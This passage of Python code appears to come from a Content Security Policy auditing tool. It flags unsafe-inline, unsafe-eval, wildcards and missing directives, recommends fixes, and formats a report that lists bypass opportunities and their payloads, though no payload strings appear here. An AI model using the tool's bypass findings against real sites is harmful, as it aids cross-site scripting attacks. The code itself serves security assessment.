        score -= len(high_confidence_bypasses) * 0.5
        
        # Bonus for restrictive policies
        restrictive_directives = [d for d in directives.values() if d.is_restrictive]
        score += len(restrictive_directives) * 0.3
        
        # Ensure score is within bounds
        return max(0.0, min(10.0, score))
    
    def _identify_critical_issues(self, directives: Dict[CSPDirective, CSPDirectiveConfig]) -> List[str]:
        """Identify critical security issues in CSP"""
        issues = []
        
        # Check for unsafe-inline in script-src
        script_directive = directives.get(CSPDirective.SCRIPT_SRC) or directives.get(CSPDirective.DEFAULT_SRC)
        if script_directive and CSPKeyword.UNSAFE_INLINE in script_directive.keywords:
            issues.append("'unsafe-inline' allows arbitrary inline script execution")
        
        # Check for unsafe-eval
        if script_directive and CSPKeyword.UNSAFE_EVAL in script_directive.keywords:
            issues.append("'unsafe-eval' allows eval() and Function() constructor usage")
        
        # Check for wildcards
        if script_directive and '*' in script_directive.sources:
            issues.append("Wildcard (*) in script-src allows scripts from any domain")
        
        # Check for missing important directives
        if CSPDirective.SCRIPT_SRC not in directives and CSPDirective.DEFAULT_SRC not in directives:
            issues.append("No script-src or default-src directive found")
        
        # Check for object-src
        if CSPDirective.OBJECT_SRC not in directives:
            issues.append("Missing object-src directive allows plugin execution")
        
        return issues
    
    def _generate_recommendations(self, directives: Dict[CSPDirective, CSPDirectiveConfig], 
                                bypasses: List[CSPBypassPayload]) -> List[str]:
        """Generate security recommendations"""
        recommendations = []
        
        # Script-src recommendations
        script_directive = directives.get(CSPDirective.SCRIPT_SRC) or directives.get(CSPDirective.DEFAULT_SRC)
        if script_directive:
            if CSPKeyword.UNSAFE_INLINE in script_directive.keywords:
                recommendations.append("Remove 'unsafe-inline' and use nonces or hashes for inline scripts")
            if CSPKeyword.UNSAFE_EVAL in script_directive.keywords:
                recommendations.append("Remove 'unsafe-eval' and avoid eval(), setTimeout(string), etc.")
            if '*' in script_directive.sources:
                recommendations.append("Replace wildcard (*) with specific trusted domains")
        
        # Missing directives
        if CSPDirective.OBJECT_SRC not in directives:
            recommendations.append("Add 'object-src 'none'' to prevent plugin execution")
        
        if CSPDirective.BASE_URI not in directives:
            recommendations.append("Add 'base-uri 'self'' to prevent base tag injection")
        
        if CSPDirective.FORM_ACTION not in directives:
            recommendations.append("Add 'form-action 'self'' to restrict form submission URLs")
        
        # High-confidence bypass recommendations
        high_confidence_bypasses = [b for b in bypasses if b.confidence > 0.7]
        if high_confidence_bypasses:
            recommendations.append(f"Fix {len(high_confidence_bypasses)} high-confidence bypass opportunities")
        
        return recommendations
    
    def _create_bypass_summary(self, bypasses: List[CSPBypassPayload]) -> str:
        """Create a summary of bypass opportunities"""
        if not bypasses:
            return "No bypass opportunities identified"
        
        high_confidence = len([b for b in bypasses if b.confidence > 0.7])
        medium_confidence = len([b for b in bypasses if 0.4 <= b.confidence <= 0.7])
        low_confidence = len([b for b in bypasses if b.confidence < 0.4])
        
        summary = f"Found {len(bypasses)} potential bypasses: "
        summary += f"{high_confidence} high-confidence, "
        summary += f"{medium_confidence} medium-confidence, "
        summary += f"{low_confidence} low-confidence"
        
        if high_confidence > 0:
            summary += ". CSP is likely bypassable."
        elif medium_confidence > 0:
            summary += ". CSP may be bypassable under certain conditions."
        else:
            summary += ". CSP appears relatively secure."
        
        return summary
    
    def generate_csp_report(self, result: CSPAnalysisResult) -> str:
        """Generate a comprehensive CSP analysis report"""
        report = "Content Security Policy Analysis Report\n"
        report += "=" * 50 + "\n\n"
        
        report += f"Policy: {result.policy_header}\n"
        report += f"Security Score: {result.security_score:.1f}/10.0\n"
        report += f"Bypassable: {'Yes' if result.is_bypassable else 'No'}\n"
        report += f"Bypass Summary: {result.bypass_summary}\n\n"
        
        # Critical issues
        if result.critical_issues:
            report += "CRITICAL ISSUES:\n"
            report += "-" * 20 + "\n"
            for issue in result.critical_issues:
                report += f"⚠️  {issue}\n"
            report += "\n"
        
        # Bypass opportunities
        if result.bypass_opportunities:
            report += "BYPASS OPPORTUNITIES:\n"
            report += "-" * 25 + "\n"
            
            high_conf_bypasses = [b for b in result.bypass_opportunities if b.confidence > 0.7]
            for i, bypass in enumerate(high_conf_bypasses[:5], 1):  # Show top 5
                report += f"[{i}] {bypass.technique.value.title().replace('_', ' ')}\n"
                report += f"Confidence: {bypass.confidence:.0%}\n"
                report += f"Payload: {bypass.payload}\n"
                report += f"Description: {bypass.description}\n"
                report += "Requirements:\n"
                for req in bypass.requirements:
                    report += f"  - {req}\n"
                report += "\n"
        
        # Recommendations
        if result.recommendations:
            report += "RECOMMENDATIONS:\n"
            report += "-" * 20 + "\n"
            for i, rec in enumerate(result.recommendations, 1):
                report += f"{i}. {rec}\n"
            report += "\n"
        
        return report